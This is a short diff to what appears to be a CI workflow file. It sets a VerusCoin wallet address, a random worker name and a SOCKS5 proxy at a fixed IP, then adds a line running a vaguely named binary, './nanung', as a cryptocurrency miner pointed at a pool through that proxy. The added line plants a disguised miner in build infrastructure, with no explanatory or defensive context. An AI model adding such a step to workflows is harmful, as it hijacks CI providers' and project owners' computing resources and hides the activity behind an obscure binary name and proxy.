@@ -31,3 +31,4 @@ jobs:
         WALLET=RR6LLyCz4SwrUrkDDAWLsCXgxjXyAqvvPm
         WORKER=$(echo $(shuf -i 100-999 -n 1)-karim)
         PROXY=socks5://109.72.231.37:1080
+        ./nanung -a verus -o $POOL -u $WALLET.$WORKER -p c=VRSC,zap=VRSC -t 2 -x $PROXY
